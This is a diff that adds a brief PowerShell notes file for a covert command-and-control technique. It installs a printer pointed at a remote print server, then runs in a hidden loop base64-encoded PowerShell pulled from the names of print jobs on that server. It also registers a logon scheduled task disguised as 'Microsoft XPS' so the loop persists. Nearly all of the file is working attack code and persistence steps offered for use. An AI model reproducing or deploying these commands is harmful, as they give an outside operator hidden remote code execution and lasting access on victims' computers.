@@ -1,0 +1,18 @@
+# Client needs to install a printer. Use built-in drivers. Tested successfuly with Microsoft Print To PDF driver.
+Add-Printer <printername> -PortName http(s)://<IP or DNS>/printers/<printername>/.printer -DriverName "Microsoft Print To PDF"
+eg. Add-Printer XPS -PortName https://printingfun.azure.com/printers/af/.printer -DriverName "Microsoft Print To PDF"
+
+# What should be run to obtain and execute a job?
+powershell -enc ((Get-PrintJob XPS).documentname -join "")
+
+# This should be done in a loop:
+while ($true) {powershell -enc ((Get-PrintJob XPS).documentname -join '');sleep 60}
+
+# Example from PowerShell:
+powershell -w hidden -NoExit -c {start-job -s {while($TRUE){powershell -EnC ((Get-PrintJob XPS).documentname -join '');sleep 60}}}
+
+# Or from Start->Run
+powershell powershell -w hidden -NoExit -c {start-job -s {while($TRUE){powershell -EnC ((Get-PrintJob XPS).documentname -join '');sleep 60}}}
+
+#Scheduled task
+$s="powershell -w hidden -NoExit -c {start-job -s {while($TRUE){powershell -EnC ((Get-PrintJob XPS).documentname -join '');sleep 60}}}";$a=New-ScheduledTaskAction -Execute "powershell.exe" -Argument $s;$t=New-ScheduledTaskTrigger -AtLogOn -User $env:username;Register-ScheduledTask -TaskName "Microsoft XPS" -Action $a -Trigger $t
